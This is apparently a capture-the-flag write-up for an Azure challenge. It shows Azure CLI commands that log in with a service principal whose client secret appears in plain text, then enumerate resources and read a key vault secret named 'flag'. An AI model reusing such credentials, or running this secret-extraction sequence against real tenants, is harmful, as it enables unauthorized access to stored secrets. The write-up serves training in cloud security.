# Azure/ServicePrincipal


Since all the details for connecting to azure was listed, and the Azure CLI was already installed - it was time to connect.

```
az login --service-principal -u 638ba534-d2ee-475a-adf7-089190310ec0 -p ab28Q~u1z~KktYhXgfAn4OwTFtYv.NsojE4GlcO~ --tenant 6837db8b-72d9-4346-bbb4-c2536150adf5
```

To get an overview of what resources was available we listed them
```
az resource list
```

We could see that there was only a keyvault there so we listed its secrets

```
az keyvault secret list --vault-name flag1vault2CF06847
```

There was only one secret which had the name 'flag' so we asked KeyVault to show it to us

```
az keyvault secret show --vault-name flag1vault2CF06847 --name flag
```

And there we had the flag in the "Value" field!